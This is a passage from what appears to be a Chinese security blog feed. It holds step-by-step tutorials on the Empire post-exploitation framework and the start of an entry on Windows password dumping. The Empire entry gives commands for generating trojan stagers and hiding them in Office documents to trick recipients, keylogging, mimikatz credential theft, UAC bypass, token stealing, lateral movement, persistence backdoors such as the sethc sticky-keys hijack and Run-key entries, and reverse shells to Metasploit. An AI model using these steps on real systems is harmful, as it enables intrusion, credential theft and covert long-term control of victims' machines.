：只需要进行一次查询，就可以获取域里面的所有用户。使用方法为，从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSession获取。因此不需要使用Invoke-UserHunter对每台机器进行操作，所以这个方法的隐蔽性相对较高(但涉及的机器不一定全面)。PowerView默认使用Invoke-SteathUserHunter,如果找不到需要的信息，就使用Invoke-UserHunter。</li><li>Invoke-UserHunter :找到域内特定的用户群，接收用户名，用户列表和域组查询，接收一个主机列表或查询可用的主机域名。它可以使用Get-NetSessions和Get-NetLoggedon(调用NetSessionEnum和NetWkstaUserEnum API)扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</li></ul><p>下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><p><strong>5.Empire中的user_hunter模块</strong><br> 在 Empire 下user_hunter模块用来查找域管理员登录的机器的。<br>获取反弹shell<br>使用命令<br>usemodule situational_awareness&#x2F;network&#x2F;powerview&#x2F;user_hunter<br>我机器出问题了就不演示这个了</p><p>参考：<a href="https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/">https://timeshu.github.io/2020/02/08/%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%9A%E4%BD%8D%E5%B7%A5%E5%85%B7/</a></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>定位域管理员</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Empire使用</title>
    <link href="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于Powershell的远程控制木马。</p><p>全部功能参照：<a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>git  clone <a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p><p>接着</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> Empire<br><span class="hljs-built_in">cd</span> setup<br>sudo ./install.sh<br>./empire          <span class="hljs-comment">#即可打开</span><br></code></pre></td></tr></table></figure><p>和metasploit使用原理都是一样的，都是先设置一个监听，接着生成木马，然后在目标主机中运行该木马，我们的监听就会连接上返弹回来的代理</p><h4 id="建立监听："><a href="#建立监听：" class="headerlink" title="建立监听："></a>建立监听：</h4><p>输入Listeners   进入监听线程界面    可以输入help查看帮助</p><p>接着输入uselistener来设置采用何种模式，通过双击tab键可以看到一共有7中模式：</p><p>dbx,http,http_com,http_foreign,http_hop,http_mapi,meterpreter</p><p>使用http监听模式：</p><p>uselistener  http</p><p>然后输入     info       查看具体参数</p><p>通过set命令设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Name  shuteer<br><span class="hljs-built_in">set</span> Host XX.XX.XXX.XX:XXX (Empir所在服务器IP)<br><br>HOST是我们VPN的IP，所以就不做修改了，修改完后可以再次输入info，查看设置是否正确<br>然后输入execute即可监听<br></code></pre></td></tr></table></figure><p>输入back命令即可返回上一层listeners界面</p><p>输入list命令可以列出当前激活的listener</p><p>使用kill命令就能删除该监听</p><p>agents下：</p><p>kill all 杀死所有进程</p><p>remove all 删除所有</p><h4 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h4><p>输入usestaget来设置采用何种模块，同样双击tab键，可以看到共26个模块。</p><p>其中multi为通用模块，osx是mac操作系统模块，剩下的就是windows的模块。</p><ul><li><p>DLL木马</p><p>想要设置dll木马，首先输入    usestager  windows&#x2F;dll</p><p>然后输入info命令查看详细参数。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Listener shuteer<br>execute     <span class="hljs-comment">#生成木马</span><br>就会在tmp目录下生成名为launcher.dll木马<br></code></pre></td></tr></table></figure></li><li><p>launcher</p><p>如果只需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher    &lt;language&gt;&lt;listerName&gt;<br></code></pre></td></tr></table></figure><p>将很快生成一行base64编码代码，这里输入back命令回到listener下</p><p>然后输入launcher powershellshuteer(当前设置的listener名字)命令来生成一个payload.</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">launcher  powershell <span class="hljs-keyword">shuteer </span>    <span class="hljs-comment">#生成powershell代码</span><br></code></pre></td></tr></table></figure></li><li><p>launcher_vbs木马</p><p>输入usestager windows&#x2F;launcher_vbs</p><p>输入info   查看设置参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute                  <span class="hljs-comment">#生成的文件在tmp目录下</span><br></code></pre></td></tr></table></figure><p>最后输入back回到listener开始监听</p><p>如果要生成powershell代码，设置完listener后不输入execute，直接输入back,然后输入launcher powershll shuteer即可</p></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher   powershell shuteer<br></code></pre></td></tr></table></figure><ul><li><p>launcher_bat木马</p><p>usestager    windows&#x2F;launcher_bat</p><p>info</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">set listener  shuteer<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>                <br></code></pre></td></tr></table></figure><p>为了增加迷惑性，也可以将该批处理文件插入一个offic文件中，这里随便找一个word或者excel文件中，单击”插入”–&gt;”对象”–&gt;”由文件创建-“-&gt;</p></li></ul><p>“浏览”(选择刚刚生成的批处理文件，然后勾选”显示为图标”)</p><p>在”更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel，Word或者PowerPoint图标</p><p>选择完之后，点击确定，该对象就会插入到文件中</p><p>将该文件发给别人，一旦打开该文件，并运行了内嵌的批处理文件，就会得到这个主机的权限</p><p>360安全卫士会报告发现宏病毒</p><h3 id="Macro木马："><a href="#Macro木马：" class="headerlink" title="Macro木马："></a>Macro木马：</h3><p>要想设置Macro木马，首先需要输入usestager windows&#x2F;macro命令然后输入info命令插卡详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Set listener  shuteer<br>Execute<br></code></pre></td></tr></table></figure><p>默认会生成一个宏，储存在&#x2F;tmp&#x2F;macro文件中</p><p>然后需要将生成的宏添加到一个Office文档里面，这里打开一个word文件，单击‘视图’    标签，选择   ‘宏’    ，在‘宏的位置’    选择当前文件，宏名可以任意起一个，然后单击  ”创建“    按钮</p><p>单击  ”创建“  按钮以后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制进去，另存为一个新文件。</p><p>最后将这个修改果的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略。</p><h3 id="Ducky"><a href="#Ducky" class="headerlink" title="Ducky:"></a>Ducky:</h3><p>输入  usestager   windows&#x2F;ducky</p><p>然后   info   查看帮助信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute<br></code></pre></td></tr></table></figure><p>执行完就可以生成用于烧制的代码</p><p>将该代码烧制至”小黄鸭“中，插入目标用户的计算机，就可以反弹回来。</p><p><a href="https://www.freebuf.com/geek/141839.html">https://www.freebuf.com/geek/141839.html</a></p><h2 id="连接主机的基本使用："><a href="#连接主机的基本使用：" class="headerlink" title="连接主机的基本使用："></a>连接主机的基本使用：</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>1.列出以连接的主机</p><p>agents</p><p>然后使用   interact 连接主机<br><img src="https://img-blog.csdnimg.cn/2021050112572188.png" alt="在这里插入图片描述"></p><p>输入help 可以查看帮助信息</p><p>2.一些基本命令</p><ul><li><p>pwd     显示当前目录</p></li><li><p>getpid   查看当前进程<br><img src="https://img-blog.csdnimg.cn/20210501125820900.png" alt="在这里插入图片描述"></p></li><li><p>输入help agentcmds     可以看到可供使用的常用命令<br><img src="https://img-blog.csdnimg.cn/20210430173409997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li><li><p>在使用部分cmd命令时，要使用”shell +命令”的格式</p></li><li><p>内置mimikatz但需要管理员权限<br>输入mimikatz<br>然后输入 creds命令可以自动过滤，整理出获取的用户密码<br><img src="https://img-blog.csdnimg.cn/20210501125901170.png" alt="在这里插入图片描述"></p></li></ul><p>导出凭证：creds export 目录&#x2F;xx</p><ul><li>在实际渗透过程中，由于种种原因，总会有部分主机丢失或失效，可以输入<br>list stale  命令列出已经丢失的反弹主机，然后输入remove stale 命令删去已经失效的主机<br><img src="https://img-blog.csdnimg.cn/20210501125925796.png" alt="在这里插入图片描述"></li></ul><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>可以使用search  module 命令搜索需要使用的模块</p><p>通过使用 usemodule collection 然后Tab查看完整的列表</p><p>1.截屏</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/screenshot<br><br>info <br><br>execute<br>back<br></code></pre></td></tr></table></figure><p>2.键盘记录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/keylogger<br>info<br>execute<br>back<br></code></pre></td></tr></table></figure><p>如果要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs即可显示当前在后台的记录</p><p>如果要停止记录输入</p><p>jobs kill  jobs_name</p><p>3.查找共享</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/share_finder<br>execute<br>back<br></code></pre></td></tr></table></figure><p>4.收集目标主机信息</p><p>该模块可以查看本机用户。域组成员，最后的密码设置时间，剪贴板内容，系统基本信息，网络适配器等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/winenum<br>execute<br></code></pre></td></tr></table></figure><p>5.列举系统信息(重点)</p><p>几乎列举了系统中的所有有用信息，如目标主机时间日志，应用程序控制策略日志，包括RDP登录信息，powershell脚本运行和保存的信息等。在运行这个脚本时需要管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/computerdetails<br>execute<br></code></pre></td></tr></table></figure><p>6.ARP扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule  situational_awareness/network/arpscan<br><span class="hljs-built_in">set</span> Range 192.168.31.0-192.168.31.254     <span class="hljs-comment">#设置扫描网段</span><br>execute<br></code></pre></td></tr></table></figure><p>7.DNS信息收集</p><p>在内网中，知道所有及其的Hostname和对应的IP地址对分析内网结构至关重要</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/reverse_dns<br>execute<br></code></pre></td></tr></table></figure><p>如果主机有两张网卡，Empire也会显示出来。方便我们寻找边界主机</p><p>8.查找域管登录服务器IP</p><p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块就是用来查找域管登录的机器,可以清除的看到那个用户登录了那台主机<br>usemodule  situational_awareness/network/powerview/user_hunter<br></code></pre></td></tr></table></figure><p>9.本地管理组访问模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/find_localadmin_access<br></code></pre></td></tr></table></figure><p>10.获取域控制器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/get_domain_controller<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501123516505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得知当前域服务器名为DC</p><p>在验证能否访问域服务器DC的“C$’’</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SH">shell <span class="hljs-built_in">dir</span> \\DC\C$<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210430173818881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul><li><p>Bypass  UAC</p><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/bypassuac<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>然后会发现上线了一个新的反弹</p><p>back</p><p>agents</p><p>带星号的即为权限提升成功的agents</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3pKc9smF-1619775511101)(..&#x2F;typora&#x2F;pic&#x2F;image-20201226224409704.png)]</p></li><li><p>bypassuac_wscript</p><p>这个模块的大概原理是使用c:\Windows\wscript.exe执行payload,即绕过UAC实现管理员权限执行Payload,只适用于系统位Windows 7的目标主机，目前尚没有对应的补丁，部分杀毒软件会有提示。</p><p>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">    usemodule privesc/bypassuac_wscript<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>带星号表示权限提升成功</p></li></ul><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>Empire内置了PowerUp的部分工具，用于权限提升，主要有Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式。<br><img src="https://img-blog.csdnimg.cn/20210430173840884.png" alt="在这里插入图片描述"><br>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup<br></code></pre></td></tr></table></figure><p>1.allchecks</p><p>查找系统中的漏洞，和powerSploit中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure><p>一般会列出一些提权方法：</p><p>可以尝试bypass  UAC来提权</p><p>接着输入bypassuac   root1(listener 名字)</p><p>星号表示提权成功</p><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP是采用AES 256加密的</p><p>输入以下命令即可查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><ul><li><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds</p><p>命令即可查看Empire列举的密码。</p><p>可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向渗透，首先要窃取身份</p><p>使用pth<ID>命令</p><p>这里ID就是creadID号<br><img src="https://img-blog.csdnimg.cn/20210501130010676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210501130051939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以看到执行完之后显示PID进程为2040</p><p>使用steal_token  PID命令即可窃取该身份</p><p>同样可以输入ps查看是否有域用户的进程</p><p>如果有同样通过   steal_token命令来窃取这个令牌</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">steal_token  PID<br></code></pre></td></tr></table></figure><p>输入  revtoself   命令可以将令牌权限恢复到原来的状态。</p><ul><li><h4 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule management/psinject<br><span class="hljs-built_in">set</span> Listener <br><span class="hljs-built_in">set</span> ProcId             <span class="hljs-comment">#设置进程id</span><br></code></pre></td></tr></table></figure><p>该模块进行进程注入，获取权限。</p><p>设置Listener 和Proc  ID这两个参数运行反弹shell</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20210430173930963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><h4 id="Invoke-PsExec"><a href="#Invoke-PsExec" class="headerlink" title="Invoke-PsExec"></a>Invoke-PsExec</h4></li></ul><p>  缺点：是能被基本的杀毒软件检测并留下日志，而且需要开启admiin$445端口共享</p><p>  优点：是可以直接返回system权限。</p><p>  该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此进一步持续渗透整个内网。</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_psexec<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure><p>  [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EiuWuqes-1619775582049)(..&#x2F;typora&#x2F;pic&#x2F;image-20201227125717808.png)]</p><ul><li><h4 id="Invoke-WMI"><a href="#Invoke-WMI" class="headerlink" title="Invoke -WMI"></a>Invoke -WMI</h4><p>比Ps-Exec安全，所有windows系统都启用了该服务，不会写入日志。极高隐蔽性。如果目标机开启了防火墙WMI将无法连接目标机器。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li><li><h4 id="PowerShell-Remoting"><a href="#PowerShell-Remoting" class="headerlink" title="PowerShell Remoting"></a>PowerShell Remoting</h4><p>Powershell Remoting是Powershell 的远程管理功能。开启windows远程管理服务WinRM系统会监听5985端口，该服务默认在windows server2012中是开启的，在windows server 2003&#x2F;2008&#x2F;2008 R2中需要手动启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">   usemodule lateral_movement/invoke_paremoting<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>  后门最主要的目的就是方便以后再次秘密进入或者控制系统</p><ul><li><h4 id="权限持久性劫持shift后门"><a href="#权限持久性劫持shift后门" class="headerlink" title="权限持久性劫持shift后门"></a>权限持久性劫持shift后门</h4><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi_debugger<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br><span class="hljs-built_in">set</span> TargetBinary  sethc.exe<br>execute<br></code></pre></td></tr></table></figure><p>运行完后再目标主机远程登录窗口按5次shift键即可触发后门。</p><p>sethc.exe可以替换成以下这几项：</p><p>1.Utilman.exe(使用Win+U组合键启动)</p><p>2.osk.exe(屏幕上的键盘：使用win+U启动组合键)</p><p>3.Narrator.exe(启动讲述人：使用win+U启动组合键)</p><p>4.Magnify.exe(放大镜:使用Win+U组合键启动)</p></li><li><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/userland/registry<br><span class="hljs-built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run<br>execute<br></code></pre></td></tr></table></figure><p>当我们登录系统时木马就会运行，服务端反弹成功。</p></li><li><h4 id="计划任务获得系统权限"><a href="#计划任务获得系统权限" class="headerlink" title="计划任务获得系统权限"></a>计划任务获得系统权限</h4><p>到了具体的时间将成功返回一个高权限shell,再实际渗透模块中运行该模块时，杀毒软件会有提示</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/elevated/schtasks<br><span class="hljs-built_in">set</span> Listener wei<br><span class="hljs-built_in">set</span> DailyTime 15:36<br>execute<br></code></pre></td></tr></table></figure><p>这里如果把 set RegPath改为    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</p><p>那么就会再15:36添加一个注册表注入后门。</p></li></ul><h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><p>在实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用Powershell来绕过，也可以执行Empire的payload来绕过，成功之后在使用Empire的模块将其反弹回Metasploit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule code_execution/invoke_shellcode<br><span class="hljs-built_in">set</span> Lhost                 <span class="hljs-comment">#设置msf所在主机的IP</span><br><span class="hljs-built_in">set</span> Lport                  <span class="hljs-comment">#设置端口</span><br>execute<br></code></pre></td></tr></table></figure><p>在msf上设置监听：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost                    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> lport    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> Shellcode                <span class="hljs-comment">#自定义shellcode注入</span><br>run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>Empire使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网密码抓取</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h2 id="Hash读取"><a href="#Hash读取" class="headerlink" title="Hash读取"></a>Hash读取</h2><p>在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。</p><p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="https://img-blog.csdnimg.cn/20210501163013602.png" alt="在这里插入图片描述"><br>下载地址:<a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="https://img-blog.csdnimg.cn/20210502170711144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载地址：<a href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="https://img-blog.csdnimg.cn/202105021711530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 